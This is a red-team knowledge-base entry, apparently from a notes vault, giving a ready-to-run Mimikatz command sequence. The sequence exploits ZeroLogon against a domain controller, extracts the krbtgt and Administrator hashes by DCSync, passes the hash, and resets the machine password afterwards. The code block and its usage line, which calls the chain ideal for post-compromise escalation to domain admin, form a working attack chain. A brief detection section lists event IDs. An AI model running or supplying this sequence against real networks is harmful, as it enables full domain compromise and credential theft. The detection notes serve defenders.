---
id: 5b130155-5d5c-4141-b1de-abeeb82dd9e4
name: mimikatz-zerologon-and-dcsync-sequence
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:02.673563+00:00'
updated_at: '2023-04-10T20:36:01.279000+00:00'
platforms:
  - Windows
tags:
  - mimikatz
  - zerologon
  - dcsync
validated: true
---

# mimikatz-zerologon-and-dcsync-sequence

## Code

```powershell
privilege::debug
# Check for the CVE
lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$

# Exploit the CVE and set the computer account's password to ""
lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit

# Execute dcsync to extract some hashes
lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm

# Pass The Hash with the extracted Domain Admin hash
sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN

# Use IP address instead of FQDN to force NTLM with Windows APIs 
# Reset password to Waza1234/Waza1234/Waza1234/
# https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584
lsadump::postzerologon /target:10.10.10.10 /account:DC01$
```

## Description

Mimikatz command sequence to elevate privileges with debug token, check and exploit ZeroLogon, perform DCSync on krbtgt and admin, create PTH ticket, and post-exploit password reset.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| DC01.LAB.LOCAL | DC FQDN | DC01.LAB.LOCAL |
| DC01$ | Machine account | DC01$ |
| LAB.LOCAL | Domain | LAB.LOCAL |
| "" | Empty password post-exploit | "" |
| HASH_NTLM_ADMIN | Extracted NTLM hash | Actual hash |
| 10.10.10.10 | DC IP for NTLM force | 10.10.10.10 |

## Usage

Execute in Mimikatz on a high-priv Windows host to chain ZeroLogon with credential access. Ideal for post-compromise escalation to DA.

## Detection

- Mimikatz process signatures or LSASS dumps (Event ID 4672/4673).
- DCSync replication requests (ID 4662).
- PTH token creation alerts in EDR.

## Related

- [[procedures/ZeroLogon-Exploitation-and-Post-Exploitation]]
- [[tools/Mimikatz]]
